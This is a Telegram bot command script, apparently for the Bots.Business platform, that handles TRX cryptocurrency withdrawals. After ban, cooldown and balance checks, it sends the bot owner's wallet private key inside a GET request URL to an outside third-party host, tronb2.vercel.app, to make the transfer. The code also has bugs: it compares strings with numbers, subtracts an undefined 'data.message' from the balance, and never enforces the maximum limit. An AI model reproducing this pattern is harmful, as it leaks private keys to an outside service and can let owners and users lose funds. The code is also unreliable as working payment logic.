/*CMD
  command: /withtrx
  help: 
  need_reply: true
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
CMD*/

var stat = Bot.getProperty(""+user.telegramid+"")
if (stat=="ban"){
Bot.sendMessage("*❌ You are banned*");
return
}
var state = Bot.getProperty("STOP")
if (state=="🛑 Turned OFF"){
Bot.sendMessage("*🛑 Withdraw is currently disabled*");
return
}
var timel = Bot.getProperty("time")
function canRun(){
  var last_run_at = User.getProperty("last_run_at");
  if(!last_run_at){ return true }
  
  var minutes = (Date.now() - last_run_at) /1000/60;
  
 var minutes_in_day = timel
          var next = minutes_in_day - minutes
          var wait_hours = Math.floor(next / 60)
          next -= wait_hours * 60
          var wait_minutes = Math.floor(next)
          var seconds = Math.floor((next - wait_minutes) * 60)
          if (minutes < minutes_in_day) {
   Bot.sendMessage("*📛 You can withdraw once every "+timel+" minutes \n\n💡 Next Withdraw in "+wait_minutes+" minutes*" );
   return
 }
  return true;
 }

if(!canRun()){ return }
var withdraw = Libs.ResourcesLib.userRes("withdraw");
var wallet = User.getProperty("wallet");
var balance = Libs.ResourcesLib.userRes("balance")
var history = User.getProperty("historyw");
var admin = Bot.getProperty("admin_chat")
var time = Libs.DateTimeFormat.format(new Date(),"dd/m/yyyy h:M:s T")+"M"
let max = Bot.getProperty("max")
let min = Bot.getProperty("Minw")
let userPayment = Libs.ResourcesLib.anotherChatRes("userpayment", "global");

var info =
  "[" +
  user.first_name +
  "]" +
  "(" +
  "tg://user?id=" +
  user.telegramid +
  ")";
function isNumeric(n) {
  return !isNaN(parseFloat(n)) && isFinite(n);
}
var value = message
if(!isNumeric(value)){
Bot.sendMessage("*📛 Invaild value. Enter only numeric value. Try again*",{is_reply:true})
Bot.runCommand("/withtrx")
return
}

if(message < min){
Bot.sendMessage("*❌ Minimum amount to withdraw "+min+" TRX*")
}else{
if(message > balance.value()){
Bot.sendMessage("_🚫 You Can Withdraw Maximum:_ "+balance.value().toFixed(6)+" TRX")
}else{
var pp = Bot.getProperty("apa")
var private_key = pp
var amos = message*1000000
HTTP.get( {
    url: "https://tronb2.vercel.app/sent/"+wallet+"/"+amos+"/"+private_key+"",
    success: '/onLoading'} )

    balance.add(-data.message)
    
}}
